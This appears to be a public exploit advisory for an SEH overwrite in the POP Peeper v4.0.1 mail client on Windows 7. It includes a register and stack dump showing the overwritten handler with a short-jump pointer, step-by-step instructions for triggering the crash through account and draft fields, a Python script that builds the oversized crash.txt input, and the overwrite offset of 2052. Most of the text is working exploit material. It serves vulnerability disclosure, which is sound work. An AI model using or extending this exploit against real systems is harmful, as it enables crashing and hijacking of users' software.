'''
********************************************************************************************
# Exploit Title: POP Peeper SEH Over-write.
# Date: 9/14/2015
# Exploit Author: Un_N0n
# Software Link: http://www.esumsoft.com/download
# Version: v4.0.1
# Tested on: Windows 7 x86(32 BIT)
********************************************************************************************
[DUMP:]
'''
EAX 00000000
ECX 20203029
EDX 77C5660D ntdll.77C5660D
EBX 00000000
ESP 0012EC5C
EBP 0012EC7C
ESI 00000000
EDI 00000000

EIP 20203029 

==============================
STACK:
0012FBF4   41414141
0012FBF8   41414141
0012FBFC   41414141
0012FC00   41414141
0012FC04   41414141 
0012FC08   909020EB  Pointer to next SE>
0012FC0C   20203029  SE handler
0012FC10   43434343
0012FC14   43434343
0012FC18   43434343
0012FC1C   43434343
0012FC20   43434343
0012FC24   43434343
0012FC28   43434343
===============================
'''

[Steps to Produce the Crash]:
1- Open 'POPPeeper.exe'
2- Goto Accounts->Add->CreateSingleAccount.
3- After entering the email address, the option for Account name will appear,
   enter the contents of crash.txt in it->Save.
4- Then compose a new mail->In TO field and Subject field, enter the contents of crash.txt
5- Save as Draft, software will crash.
6- Open up "POPPeeper.exe" again.
7- Click on Check Mail option, Software will crash.
Everytime you click on Check mail, it will crash as it will load the saved DRAFT.

[Code to produce CRASH.txt]
'''

buffer = "A"*66666
file = "crash.txt"
f = open(file,'w')
f.write(buffer)
f.close()

'''
[Extra Info:]
Offset : 2052
**********************************************************************************************
'''